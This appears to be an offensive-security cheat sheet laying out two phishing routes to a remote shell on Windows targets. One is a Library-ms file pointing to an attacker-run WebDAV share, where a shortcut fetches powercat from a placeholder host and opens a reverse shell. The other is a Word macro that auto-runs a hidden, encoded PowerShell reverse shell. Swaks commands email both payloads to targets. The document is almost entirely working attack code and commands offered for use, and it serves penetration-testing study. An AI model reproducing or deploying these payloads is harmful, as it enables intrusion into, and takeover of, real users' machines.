# *library-webdav*
1. _**Configure** the **config.Library-ms** (which will provide access to webdav):_
	***REPLACE**:*
	1. *KALI_IP*
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://KALI_IP</url> <!-- #REPLACE -->
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
2. _**Setup** webdav folder on port 80:_
	***REPLACE**:*
	1. *path/to/webdav*
```shell
mkdir webdav
$(which wsgidav) --host=0.0.0.0 --port=80 --auth=anonymous --root ./webdav
```
3. _**Create** shortcut file with the below powercat payload as the path, and copy into WEBDAV folder_
	***REPLACE**:*
	1. *KALI_IP x2*
```shell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP:8080/windows/powercat.ps1');powercat -c KALI_IP -p 443 -e powershell"
```
4. _**Setup** python server on 8080 and nc listener on 443 and send email with the library as attachment, using swaks:_
	***REPLACE**:*
	1. *TARGET_IP*
	2. *TO_EMAIL*
	3. *FROM_EMAIL*
	4. *BODY.txt*
```shell
swaks -t TO_EMAIL --from FROM_EMAIL -ap --attach @config.Library-ms --server TARGET_IP --body @BODY.txt --header "Subject: Universal Exploration" --suppress-data -ap
```

_**Reverse-Shell** should be obtained on our listener_


# ***Word-Macros***
### ***!!! Create & Save as .DOC (not .docx) !!!***
1. _**Test using below payload** by saving the macro and opening the document:_
```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str
End Sub
```
2. _**Use Encoded Powercat Reverse Shell** as payload to be ran w/ powershell on target:_
```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc cmd_pt_1
    Str = Str + "cmd_pt_2"
    ...
    Str = Str + "cmd_pt_last"

    CreateObject("Wscript.Shell").Run Str
End Sub
```
```python
# in KALI, breaking-up the powercat-encoded payload to parts for the macro
###########################################################################
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGU..."
n = 50
for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')

# copy-paste the output to the macro
```
3. _**Setup** python server on 80 and nc listener on 443 and send payload using **swaks** (or any other method)_
```shell
swaks -t TO_EMAIL --from FROM_EMAIL -ap --attach @document.doc --server TARGET_IP --body @BODY.txt --header "Subject: Important Document" --suppress-data -ap
```

_**Reverse-shell** should be obtained on our listener_
